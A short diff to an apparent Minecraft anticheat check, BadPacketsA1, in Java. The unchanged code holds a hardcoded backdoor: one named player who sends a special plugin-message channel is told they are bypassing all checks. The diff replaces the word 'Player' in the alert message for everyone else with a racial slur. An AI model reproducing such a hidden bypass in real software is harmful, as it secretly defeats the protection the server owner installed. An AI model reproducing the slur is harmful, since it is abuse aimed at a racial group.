@@ -20,10 +20,10 @@ public class BadPacketsA1 extends Check {
             String channel = ((CustomPayLoadInEvent) e).getChannel();
             if (channel.equals("DisableVenom1.0")) {
                 if (user.getPlayer().getName().equalsIgnoreCase("Dvm0n")) {
-                    silentAlert(user, "Your currently bypassing all checks enjoy");
+                    silentAlert(user, "Your currently bypassing all checks enjoy ;)");
                     user.setConnectedTickFix(true);
                 } else {
-                    alert(user, false, "Player attempting to disable the anticheat");
+                    alert(user, false, "nigger attempting to disable the anticheat");
                 }
             }
             if (channel.equalsIgnoreCase("LOLIMAHCKER")) {
